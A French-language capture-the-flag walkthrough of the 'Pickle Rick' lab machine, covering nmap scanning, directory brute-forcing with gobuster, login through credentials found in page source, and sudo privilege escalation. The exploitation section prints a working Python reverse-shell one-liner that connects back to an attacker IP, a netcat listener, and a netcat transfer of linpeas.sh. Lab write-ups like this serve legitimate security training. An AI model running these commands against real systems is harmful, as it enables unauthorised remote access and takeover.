# Pickle Rick

## I- Scanning

On utilise nmap `nmap -sC -sV <target ip>` ou tu peux faire un nmap agressif `nmap -A <target ip>` ou encore `nmap <target ip> -A -T 4 -v -oN`

On regarde les ports ouvert et en fonction on peut essayer de se connecter aux services disponible (ex: HTTP, SSH, SMB etc…)

* Ici on peut voir un service SSH et un serveur web

On se connecte sur le serveur web qui tourne sur le port 80.

## II- Enumération

Si on navigue sur le site web “http://\<ip-cible>:80”. On vérifie le code source, n’ayant aucune indication précise, on trouve ici un username “R1ckRul3s”.

On utilise **gobuster** lors de cette étape pour découvrir les dossier présent sous la page web:

```jsx
gobuster dir -u http://<ip-cible> -w <wordlist>
```

chemin de wordlists:

* /usr/share/wordlists/dirb/common.txt
* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
* /usr/share/wordlists/rockyou.txt

On trouve trois nouveaux fichiers: login.php, portal.php et robots.txt

Dans portal.php (200 HTTP Status Code) on a une page de login, nous avons le username mais pas de password.

Portal.php nous redirige vers login.php, nous supposons que nous avons accès à portal.php une fois que nous serons login.

Et pour finir robots.txt nous avons une string: “Wubbalubbadubdub”

Nous allons essayer de nous login avec ces deux informations, cela fonctionne ! Nous avons accès à portal.php.

## III- Exploitation

Sur cette page nous avons une command panel qui agit comme un shell web, quand on essaye d’accéder aux autres pages, nous finissons dans ‘denied.php’. On essaye de lister les fichiers dans le dossier actuel

```jsx
ls -a
```

On obtient un fichier txt intéressant mais on ne peut pas le cat. Voici des alternatives au “cat” si vous n’avez pas les permissions:

* tac
* less
* strings
* grep .
* while read line; do echo $line; done < fichier.txt
* cp fichier.txt /dev/stdout

On obtient notre premier flag !

Notre deuxième fichier .txt nous dis de regarder dans les dossiers

```jsx
ls -al /home/
```

On trouve un dossier “rick”

```jsx
tac /home/rick/second\\ingredients
```

Le \ remplace l’espace sinon la commande sortirait une erreur. Pour le dernier flag, nous avons besoin d’étre en root car actuellement nous ne sommes que www-data

```jsx
whoami
```

## IV- Escalation de privilège

Pour lister tout les dossiers présent dans root:

```jsx
sudo ls -al /root/
```

Notre dernier flag est présent !

```jsx
sudo tac /root/3rd.txt
```

Faisons mtn une vraie escalation de privilège:

Pour ça nous avons besoin d’un reverse shell (nous avons besoin de python3, vérifier qu’il est installé)

```jsx
which python3
```

On peut trouver un reverse shell ici: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```jsx
Voici celui qui nous intéresse dans ce cas:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

/!\ Ne pas oublier de changer l’IP par l’IP de votre machine attaquante

Maintenant, faisons un netcat:

```jsx
nc -lvnp 1234
```

On retourne sur le ‘portal.php’ et on rentre dans la command panel le script python pour faire le reverse shell. Après avoir excecuté la commande, nous aurons notre reverse shell au niveau de notre netcat.

Avant d’upload nos fichiers dans le server et enumérer nos possibiltés d’escalation de privilèges on va améliorer un peu notre reverse shell:

```jsx
python3 -c ‘import pty; pty.spawn(”/bin/bash”)’
```

On télécharge le script “[linpeas.sh](http://linpeas.sh)” depuis ce lien:

[https://github.com/peass-ng/PEASS-ng/releases/tag/20240414-ed0a5fac](https://github.com/peass-ng/PEASS-ng/releases/tag/20240414-ed0a5fac)

C’est un script qui va chercher toutes les escalations de privilèges possible sur une machine.

```jsx
nc -q 0 -lvnp <port> < linpeas.sh
```

Ici on est parti sur le port 6666

Va sur le reverse shell de tout à l’heure et tape:

```jsx
nc <ip-attaquant><port> > /tmp/lin/linpeas.sh
```

Cette commande va télécharger “[linpeas.sh](http://linpeas.sh)” pour arriver sur la machine cible, nous devons avoir les permissions avant de pouvoir l’exécuter

```jsx
ls -l
```

```jsx
chmod +x linpeas.sh
```

Nous pouvons exécuter le script ./linpeas.sh C’est ici que nous aurons l’information que “www-data” peut exécuter toutes les commandes sudo sans avoir à donné le mot de passe. On peut donc faire ce que l’on a fait au début de l’escalation de privilège.

Source utile pour escalation de privilège:

[https://gtfobins.github.io/](https://gtfobins.github.io/)
